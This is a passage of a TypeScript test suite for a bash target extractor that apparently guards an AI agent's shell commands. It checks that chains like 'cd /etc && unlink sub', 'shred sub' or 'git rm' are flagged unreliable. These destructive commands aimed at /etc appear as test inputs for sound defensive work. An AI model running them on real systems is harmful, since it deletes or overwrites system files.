  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-uniq-reject: cd_uniq_sub_reject", () => {
  // 洞 4：uniq 裸词位置参数。
  const r = extractBashTargets("cd /etc && uniq sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-sha256sum-reject: cd_sha256sum_sub_reject", () => {
  // 洞 5：sha256sum 裸词位置参数。
  const r = extractBashTargets("cd /etc && sha256sum sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-diff-reject: cd_diff_sub_reject", () => {
  // 洞 6：diff 两个裸词位置参数。
  const r = extractBashTargets("cd /etc && diff a b", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-gzip-reject: cd_gzip_sub_reject", () => {
  // 洞 7：gzip 裸词位置参数。
  const r = extractBashTargets("cd /etc && gzip sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-xz-reject: cd_xz_sub_reject", () => {
  // 洞 8：xz 裸词位置参数。
  const r = extractBashTargets("cd /etc && xz sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-no-extractor-rel-path-reject: cd_sort_data_rel_reject", () => {
  // 洞 9：无 extractor 命令 + 可提取相对路径（looksLikePath=true）——条件 9
  // 不触发，但 sort 无 extractor 无法消费 resolveBase 提取落点，治本落空 →
  // 0 target 静默放行读 /etc/data.txt。条件 10 排除 → cd_chdir。
  const r = extractBashTargets("cd /etc && sort data.txt", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-no-extractor-abs-exempt: cd_sort_abs_exempt", () => {
  // 对照（防过度修复）：无 extractor 命令 + 绝对路径位置参数仍应豁免（D2b
  // 全绝对下游，绝对路径 cwd 无关）。`sort /tmp/data.txt` 应 reliable:true。
  const r = extractBashTargets("cd /etc && sort /tmp/data.txt", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
});

test("BMG-CD-tar-opflag-abs-exempt: cd_tar_xf_abs_exempt", () => {
  // 对照（防过度修复）：tar 操作标志 `xf` 不是路径引用，跳过它后绝对归档
  // `/tmp/a.tar` 是唯一位置参数 → D2b 豁免成立（reliable:true）。
  const r = extractBashTargets("cd /etc && tar xf /tmp/a.tar", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
});

// ============================================================
// F3（用户拍板落地）：git 写子命令在 cd 链下的安全边界
// ============================================================
//
// 用户（总体设计部）拍板：git 只读子命令（log/show/diff/status 等，pathspec
// 是 git 内部管理的查询条件，非 shell cwd 文件引用）在 cd 链下静默放行正确
// ——D2a 条件 11 不排除它们；git 写子命令（rm/add/commit/checkout/clean/mv
// 等，修改工作树文件）在 cd 链下若 cd 最终落点不在默认 tmp 目录（/tmp、
// /private/tmp、/var/tmp），则保守排除豁免（回退 cd_chdir——真实删除/覆盖
// 的文件依赖漂移后 cwd，但本解析器不把 git 路径参数提取为 target，豁免会
// 0 target 静默放行）；cd 落点在默认 tmp 目录时静默放行（tmp 无持久安全
// 价值，与 decision.ts step 2c 的 tmp_default_allowed 语义一致）。

test("BMG-CD-git-write-nontmp-rm-reject: cd_git_rm_nontmp_reject", () => {
  // git 写子命令 rm + 非 tmp 落点 → cd_chdir（用户拍板：保守排除）。
  const r = extractBashTargets("cd /etc && git rm file.txt", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-git-write-nontmp-checkout-reject: cd_git_checkout_nontmp_reject", () => {
  // git 写子命令 checkout + 非 tmp 落点 → cd_chdir。
  const r = extractBashTargets("cd /etc && git checkout file.txt", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-git-write-nontmp-add-reject: cd_git_add_nontmp_reject", () => {
  // git 写子命令 add + 非 tmp 落点 → cd_chdir。
  const r = extractBashTargets("cd /etc && git add file.txt", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-git-write-nontmp-mv-reject: cd_git_mv_nontmp_reject", () => {
  // git 写子命令 mv + 非 tmp 落点 → cd_chdir。
  const r = extractBashTargets("cd /etc && git mv a.txt b.txt", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-git-write-tmp-rm-allow: cd_git_rm_tmp_allow", () => {
  // git 写子命令 rm + tmp 落点（/tmp）→ 静默放行（用户拍板：tmp 无持久安全价值）。
  const r = extractBashTargets("cd /tmp/x && git rm file.txt", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
});

test("BMG-CD-git-write-tmp-checkout-allow: cd_git_checkout_tmp_allow", () => {
  // git 写子命令 checkout + tmp 落点（/tmp）→ 静默放行。
  const r = extractBashTargets("cd /tmp/x && git checkout file.txt", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
});

test("BMG-CD-git-write-vartmp-rm-allow: cd_git_rm_vartmp_allow", () => {
  // git 写子命令 rm + /var/tmp 落点 → 静默放行（/var/tmp 也是默认 tmp，B4）。
  const r = extractBashTargets("cd /var/tmp/x && git rm file.txt", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
});

test("BMG-CD-git-read-nontmp-log-allow: cd_git_log_nontmp_allow", () => {
  // git 只读子命令 log + 非 tmp 落点 → 静默放行（用户拍板：pathspec 非 cwd 文件引用）。
  const r = extractBashTargets("cd /etc && git log file.txt", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
});

test("BMG-CD-git-read-nontmp-status-allow: cd_git_status_nontmp_allow", () => {
  // git 只读子命令 status + 非 tmp 落点 → 静默放行。
  const r = extractBashTargets("cd /etc && git status", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
});

// ============================================================
// F2 补漏（6.3 收尾 review subagent 判 MUST_FIX_CRITICAL 后穷尽）：
// coreutils 文件命令类在 cd 链下的安全边界
// ============================================================
//
// subagent 复核判出 F2 修复不完整：无 extractor 文件命令不在 FILE_ARG_COMMANDS
//（md5sum/sha512sum/sha1sum/b2sum/cksum/comm/join/paste/nl/cut 等）仍
// `cd /etc && md5sum sub` → reliable:true + 0 target 静默放行读 /etc/sub，
// 与 F2 critical 同类别同后果。穷尽枚举后，这些命令的裸词位置参数被
// collectStagePathRefs 收集，条件 10 排除豁免（维持 cd_chdir）；绝对路径
// 位置参数仍走 D2b 豁免（防过度修复对照）。

test("BMG-CD-coreutils-md5sum-bare-reject: cd_md5sum_bare_reject", () => {
  const r = extractBashTargets("cd /etc && md5sum sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils-sha512sum-bare-reject: cd_sha512sum_bare_reject", () => {
  const r = extractBashTargets("cd /etc && sha512sum sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils-b2sum-bare-reject: cd_b2sum_bare_reject", () => {
  const r = extractBashTargets("cd /etc && b2sum sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils-cksum-bare-reject: cd_cksum_bare_reject", () => {
  const r = extractBashTargets("cd /etc && cksum sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils-comm-bare-reject: cd_comm_bare_reject", () => {
  const r = extractBashTargets("cd /etc && comm a b", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils-join-bare-reject: cd_join_bare_reject", () => {
  const r = extractBashTargets("cd /etc && join a b", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils-paste-bare-reject: cd_paste_bare_reject", () => {
  const r = extractBashTargets("cd /etc && paste sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils-nl-bare-reject: cd_nl_bare_reject", () => {
  const r = extractBashTargets("cd /etc && nl sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils-cut-bare-reject: cd_cut_bare_reject", () => {
  const r = extractBashTargets("cd /etc && cut -d: -f1 sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils-tac-bare-reject: cd_tac_bare_reject", () => {
  const r = extractBashTargets("cd /etc && tac sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils-sdiff-bare-reject: cd_sdiff_bare_reject", () => {
  const r = extractBashTargets("cd /etc && sdiff a b", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils-gunzip-bare-reject: cd_gunzip_bare_reject", () => {
  const r = extractBashTargets("cd /etc && gunzip sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils-zcat-bare-reject: cd_zcat_bare_reject", () => {
  const r = extractBashTargets("cd /etc && zcat sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils-chgrp-bare-reject: cd_chgrp_bare_reject", () => {
  const r = extractBashTargets("cd /etc && chgrp grp sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils-md5sum-abs-exempt: cd_md5sum_abs_exempt", () => {
  // 防过度修复对照：绝对路径位置参数仍走 D2b 豁免（不依赖 cwd）。
  const r = extractBashTargets("cd /etc && md5sum /tmp/a.txt", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
});

test("BMG-CD-coreutils-paste-abs-exempt: cd_paste_abs_exempt", () => {
  // 防过度修复对照：绝对路径位置参数仍走 D2b 豁免。
  const r = extractBashTargets("cd /etc && paste /tmp/a.txt", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
});

// ============================================================
// F2 补漏第二波（f2b-recheck 复核中断前提出的残留类 + 全量扫描证实）：
// 目录列举/文本编码/路径元数据/创建删除类在 cd 链下的安全边界
// ============================================================
//
// f2b-recheck 中断前要求验证 dir/vdir/shuf/base64/expand/fmt 等是否缺席
// 全部命令注册表（残留窗口检查的关键）。实测证实 20 个同类别命令仍
// reliable:true + 0 target 静默放行（含写类：unlink sub 静默删除
// /etc/sub、mkfifo sub 静默创建特殊文件）。穷尽枚举后其裸词位置参数被
// collectStagePathRefs 收集，条件 10 排除豁免（维持 cd_chdir）；绝对路径
// 位置参数仍走 D2b 豁免（防过度修复对照）。id/uname/seq/basename 等
// （位置参数为用户名/数字/字符串操作）与 echo 文本命令不纳入——其位置
// 参数非 cwd 文件引用，实测确认保持豁免。

test("BMG-CD-coreutils2-dir-bare-reject: cd_dir_bare_reject", () => {
  const r = extractBashTargets("cd /etc && dir sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-vdir-bare-reject: cd_vdir_bare_reject", () => {
  const r = extractBashTargets("cd /etc && vdir sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-shuf-bare-reject: cd_shuf_bare_reject", () => {
  const r = extractBashTargets("cd /etc && shuf sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-base64-bare-reject: cd_base64_bare_reject", () => {
  const r = extractBashTargets("cd /etc && base64 sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-basenc-bare-reject: cd_basenc_bare_reject", () => {
  const r = extractBashTargets("cd /etc && basenc sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-expand-bare-reject: cd_expand_bare_reject", () => {
  const r = extractBashTargets("cd /etc && expand sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-unexpand-bare-reject: cd_unexpand_bare_reject", () => {
  const r = extractBashTargets("cd /etc && unexpand sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-fmt-bare-reject: cd_fmt_bare_reject", () => {
  const r = extractBashTargets("cd /etc && fmt sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-fold-bare-reject: cd_fold_bare_reject", () => {
  const r = extractBashTargets("cd /etc && fold sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-ptx-bare-reject: cd_ptx_bare_reject", () => {
  const r = extractBashTargets("cd /etc && ptx sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-tsort-bare-reject: cd_tsort_bare_reject", () => {
  const r = extractBashTargets("cd /etc && tsort sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-pathchk-bare-reject: cd_pathchk_bare_reject", () => {
  const r = extractBashTargets("cd /etc && pathchk sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-realpath-bare-reject: cd_realpath_bare_reject", () => {
  const r = extractBashTargets("cd /etc && realpath sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-readlink-bare-reject: cd_readlink_bare_reject", () => {
  const r = extractBashTargets("cd /etc && readlink sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-pinky-file-flag-reject: cd_pinky_file_flag_reject", () => {
  // pinky 的 -f flag 读文件（-f 被 flag 跳过，sub 作为文件位置参数收集）。
  const r = extractBashTargets("cd /etc && pinky -f sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-mktemp-template-reject: cd_mktemp_template_reject", () => {
  // mktemp 模板落 cwd：真实创建 /etc/subXXXXXX（写类）。
  const r = extractBashTargets("cd /etc && mktemp subXXXXXX", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-link-target-reject: cd_link_target_reject", () => {
  // link 源绝对 + 目标裸词：真实在 /etc 创建硬链接 b（写类）。
  const r = extractBashTargets("cd /etc && link /tmp/a.txt b", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-unlink-bare-reject: cd_unlink_bare_reject", () => {
  // unlink 裸词：真实删除 /etc/sub（写类，删除操作静默放行是最高危形态）。
  const r = extractBashTargets("cd /etc && unlink sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-mknod-bare-reject: cd_mknod_bare_reject", () => {
  // mknod 在 cwd 创建设备特殊文件（写类）。
  const r = extractBashTargets("cd /etc && mknod sub c 1 3", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-mkfifo-bare-reject: cd_mkfifo_bare_reject", () => {
  // mkfifo 在 cwd 创建 FIFO 特殊文件（写类）。
  const r = extractBashTargets("cd /etc && mkfifo sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils2-dir-abs-exempt: cd_dir_abs_exempt", () => {
  // 防过度修复对照：绝对路径位置参数仍走 D2b 豁免（不依赖 cwd）。
  const r = extractBashTargets("cd /etc && dir /tmp/a.txt", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
});

test("BMG-CD-coreutils2-unlink-abs-exempt: cd_unlink_abs_exempt", () => {
  // 防过度修复对照：写类命令绝对路径位置参数仍走 D2b 豁免（cwd 无关）。
  const r = extractBashTargets("cd /etc && unlink /tmp/a.txt", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
});

// ============================================================
// F2 补漏第三波（final-closeout-review 判 APPROVED_WITH_CHANGES issue 1）：
// 原地覆写/分割/压缩归档/校验和/转换/补丁类在 cd 链下的安全边界
// ============================================================
//
// final-closeout-review 实证 FILE_ARG_COMMANDS 仍有同族缺席（xz/gzip/bzip2/
// zcat 已入而 lzma/lz4/zstd/bzcat/xzcat 缺席；diff 已入而 diff3 缺席），实测
// 19 命令仍 reliable:true + 0 target 静默放行（shred 原地覆写、split/csplit
// 向 cwd 写分片为最高危写形态）。补入后条件 10 排除豁免（维持 cd_chdir）。

test("BMG-CD-coreutils3-shred-bare-reject: cd_shred_bare_reject", () => {
  // shred 原地覆写：真实覆写 /etc/sub（最高危写形态）。
  const r = extractBashTargets("cd /etc && shred sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-split-bare-reject: cd_split_bare_reject", () => {
  // split 向 cwd 写分片 xaa/xab…。
  const r = extractBashTargets("cd /etc && split sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-csplit-bare-reject: cd_csplit_bare_reject", () => {
  const r = extractBashTargets("cd /etc && csplit sub 1", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-bzcat-bare-reject: cd_bzcat_bare_reject", () => {
  const r = extractBashTargets("cd /etc && bzcat sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-xzcat-bare-reject: cd_xzcat_bare_reject", () => {
  const r = extractBashTargets("cd /etc && xzcat sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-lzma-bare-reject: cd_lzma_bare_reject", () => {
  const r = extractBashTargets("cd /etc && lzma sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-lz4-bare-reject: cd_lz4_bare_reject", () => {
  const r = extractBashTargets("cd /etc && lz4 sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-zstd-bare-reject: cd_zstd_bare_reject", () => {
  const r = extractBashTargets("cd /etc && zstd sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-unzip-bare-reject: cd_unzip_bare_reject", () => {
  const r = extractBashTargets("cd /etc && unzip sub.zip", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-zip-bare-reject: cd_zip_bare_reject", () => {
  const r = extractBashTargets("cd /etc && zip a.zip sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-shasum-bare-reject: cd_shasum_bare_reject", () => {
  const r = extractBashTargets("cd /etc && shasum sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-sha3sum-bare-reject: cd_sha3sum_bare_reject", () => {
  const r = extractBashTargets("cd /etc && sha3sum sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-diff3-bare-reject: cd_diff3_bare_reject", () => {
  const r = extractBashTargets("cd /etc && diff3 a b c", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-dos2unix-bare-reject: cd_dos2unix_bare_reject", () => {
  const r = extractBashTargets("cd /etc && dos2unix sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-rev-bare-reject: cd_rev_bare_reject", () => {
  const r = extractBashTargets("cd /etc && rev sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-column-bare-reject: cd_column_bare_reject", () => {
  const r = extractBashTargets("cd /etc && column sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-pr-bare-reject: cd_pr_bare_reject", () => {
  const r = extractBashTargets("cd /etc && pr sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-patch-positional-reject: cd_patch_positional_reject", () => {
  // patch 位置参数形态：`patch sub.diff` 读补丁文件。
  const r = extractBashTargets("cd /etc && patch sub.diff", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-patch-stdin-redirect-reject: cd_patch_stdin_redirect_reject", () => {
  // patch stdin 重定向形态：`patch -p0 < p.txt` 的 p.txt 是 cwd 相对读。
  const r = extractBashTargets("cd /etc && patch -p0 < p.txt", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-bzip3-bare-reject: cd_bzip3_bare_reject", () => {
  const r = extractBashTargets("cd /etc && bzip3 sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-coreutils3-shred-abs-exempt: cd_shred_abs_exempt", () => {
  // 防过度修复对照：绝对路径位置参数仍走 D2b 豁免（cwd 无关）。
  const r = extractBashTargets("cd /etc && shred /tmp/a.txt", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
});
